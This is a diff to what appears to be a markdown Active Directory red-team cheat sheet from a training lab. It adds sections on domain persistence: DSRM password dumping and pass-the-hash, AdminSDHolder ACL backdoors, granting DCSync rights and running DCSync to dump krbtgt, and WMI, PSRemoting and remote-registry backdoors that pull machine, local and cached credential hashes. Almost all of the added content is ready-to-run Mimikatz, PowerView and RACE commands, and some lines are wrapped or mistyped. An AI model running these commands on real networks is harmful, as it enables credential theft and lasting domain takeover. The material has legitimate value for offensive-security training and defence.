@@ -1182,7 +1182,7 @@ Rubeus.exe s4u /user:devuser /rc4:539259E25A0361EC4A227DD9894719F6
 > 13. Now we can access any service on the DC; Example **`ls \\dc-corp\C$`** or 
 >
 >     ```powershell
->    PsExec64.exe \\prodsrv.garrison.castle.local -u GARRISON\prodadmin -p Password1! cmd
+>       PsExec64.exe \\prodsrv.garrison.castle.local -u GARRISON\prodadmin -p Password1! cmd
 >     ```
 
 ---
@@ -1325,6 +1325,184 @@ Rubeus.exe diamond /krbkey:5e3d2096abb01469a3b0350962b0c65cedbbc611c5eac6f3ef6fc
 
 ```powershell
 Rubeus.exe diamond /krbkey:5e3d2096abb01469a3b0350962b0c65cedbbc611c5eac6f3ef6fc1ffa58cacd5 /tgtdeleg /enctype:aes /ticketuser:administrator /domain:us.techcorp.local /dc:US-DC.us.techcorp.local /ticketuserid:500 /groups:512 /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
+```
+
+### DRSM (Directory Services Restore Mode)
+
+>   There is a local admin on every DC called “Administrator” whose password is the DRSM password. It is possible to pass the NTLM hash of this user to access the DC.
+
+###### Dump DRSM password (needs DA privs)
+
+```powershell
+# dump DRSM password hash
+Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"' -Computername us-dc
+
+# compare admin hash with the hash of below command
+Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -Computername us-dc
+
+# first one is DSRM local admin
+```
+
+###### Change logon behaviour of DSRM account
+
+```powershell
+Enter-PSSession -Computername us-dc New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD
+```
+
+###### Pass the hash
+
+```powershell
+Invoke-Mimikatz -Command '"sekurlsa::pth /domain:us-dc /user:Administrator /ntlm:917... /run:powershell.exe"'
+```
+
+###### To use PSRemoting, we must force NTLM auth
+
+```powershell
+Enter-PSSession -Computername us-dc -Authentication Negotiate
+```
+
+### AdminSDHolder
+
+###### Add FullControl permissions for a user to the AdminSDHolder using PowerView as DA
+
+```powershell
+Add-DomainObjectACL -TargetIdentity 'CN=AdminSDHolder,CN=System,dc=us,dc=techcorp,dc=local' -PrincipalIdentity studentuser1 -Rights All -PrincipalDomain us.techcorp.local -TargetDomain us.techcorp.local -Verbose
+```
+
+###### Using ActiveDirectory Module and RACE [toolkit](https://github.com/samratashok/RACE)
+
+```powershell
+Set-DCPermissions -Method AdminSDHolder -SAMAccountName studentuserl -Right GenericAll -DistinguishedName 'CN=AdminSDHolder,CN=System,dc=us ,dc=techcorp,dc=local' -Verbose
+
+Add-DomainObjectAcl -TargetIdentity
+'CN=AdminSDHolder ,CN=System, dc=us,dc=techcorp,dc=local' -
+PrincipalIdentity studentuserl -Rights ResetPassword -
+PrincipalDomain us.techcorp.local -TargetDomain us.techcorp.local -
+Verbose
+
+Add-DomainObjectAcl -TargetIdentity
+'CN=AdminSDHolder ,CN=System, dc=us,dc=techcorp,dc=local' -
+PrincipalIdentity studentuserl -Rights WriteMembers -PrincipalDomain
+us.techcorp.local -TargetDomain us.techcorp.local -Verbose
+```
+
+###### Run SDProp manually using Invoke-SDPropagator.ps1 from Tools directory
+
+```powershell
+Invoke-SDPropagator -timeoutMinutes 1 -showProgress -
+Verbose
+```
+
+###### Check DA permission
+
+```powershell
+Get-DomainObjectAcl -Identity 'Domain Admins' -
+ResolveGUIDs | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_} | ?{$_.IdentityName "studentuser1"}
+
+# Using ActiveDirectory Module:
+(Get-Acl -Path 'AD:\CN=Domain Admins , CN=Users , DC=us ,DC=techcorp,DC=local').Access | ?{$_.IdentityReference 'studentuser1'}
+```
+
+###### Abusing FullControl using PowerView
+
+```powershell
+Add-DomainGroupMember -Identity 'Domain Admins' -Members testda -Verbose
+
+# Using ActiveDirectory Module:
+Add-ADGroupMember -Identity 'Domain Admins' -Members
+```
+
+###### Abusing ResetPassword using PowerView
+
+```powershell
+Set-DomainUserPassword -Identity testda -AccountPassword (ConvertTo-SecureString "Password@123" -AsPlainText -Force) -Verbose
+
+#Using ActiveDirectory Module:
+Set-ADAccountPassword -Identity testda -NewPassword
+(ConvertTo-SecureString "Password@123" -AsPlainText -Force) -Verbose
+```
+
+### Rights Abuse
+
+###### Add FullControl rights
+
+```powershell
+Add-DomainObjectAcl -TargetIdentity "dc=us,dc=techcorp,dc=local" -PrincipalIdentity studentuserl -Rights All -PrincipalDomain us.techcorp.local -TargetDomain us.techcorp. local -Verbose
+
+# Using ActiveDirectory Module and RACE:
+Set-ADACL -SamAccountName studentuserl -DistinguishedName 'DC=us,DC=techcorp,DC=local' -Right GenericAll -Verbose
+```
+
+###### Add rights for DCSync
+
+```powershell
+Add-DomainObjectAcl -TargetIdentity "dc=us ,dc=techcorp,dc=local" -PrincipalIdentity studentuserl -Rights DCSync -PrincipalDomain
+us.techcorp.local -TargetDomain us.techcorp. local -Verbose
+
+# Using ActiveDirectory Module and RACE:
+Set-ADACL -SamAccountName studentuserl -DistinguishedName 'DC=us,DC=techcorp,DC=local' -GUIDRight DCSync -Verbose
+```
+
+###### Execute DCSync
+
+```powershell
+Invoke-Mimikatz -Command '"lsadump: :dcsync /user:us\krbtgt"'
+
+# or
+
+C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:us\krbtgt" "exit"
+```
+
+### Security Descriptors
+
+######  WMI
+
+```powershell
+# Load RACE toolkit
+C:\AD\Tools\RACE-master\RACE.ps1
+
+# On local machine for student1:
+Set-RemotewMI -SamAccountName studentuserl -Verbose
+
+# On remote machine for studentuser1 without explicit credentials:
+Set-RemotewMI -SamAccountName studentuserl -ComputerName us-dc -Verbose
+
+# On remote machine with explicit credentials. Only root\cimv2 and nested namespaces:
+Set-RemotewMI -SamAccountName studentuserl -ComputerName us-dc -Credential Administrator -namespace 'root\cimv2' -Verbose
+
+# On remote machine remove permissions:
+Set-RemotewMI -SamAccountName studentuserl -ComputerName us-dc -Remove
+```
+
+###### PowerShell Remoting
+
+```powershell
+# On local machine for studentuser1:
+Set-RemotePSRemoting -SamAccountName studentuserl -Verbose
+
+# On remote machine for studentuser1 without credentials:
+
+Set-RemotePSRemoting -SamAccountName studentuserl -ComputerName us-dc -Verbose
+
+# On remote machine, remove the permissions:
+
+Set-RemotePSRemoting -SamAccountName studentuserl -ComputerName us-dc -Remove
+```
+
+###### Remote Registry
+
+```powershell
+# Using RACE or DAMP toolkit, with admin privs on remote machine
+Add-RemoteRegBackdoor -ComputerName us-dc -Trustee studentuserl -Verbose
+
+# As studentuser1, retrieve machine account hash:
+Get-RemoteMachineAccountHash -ComputerName us-dc -Verbose
+
+# Retrieve local account hash:
+Get-RemoteLocalAccountHash -ComputerName us-dc -Verbose
+
+# Retrieve domain cached credentials:
+Get-RemoteCachedCredential -ComputerName us-dc -Verbose
 ```
 
 # VIII. Cross Domain Attacks [ Azure AD Integration ]
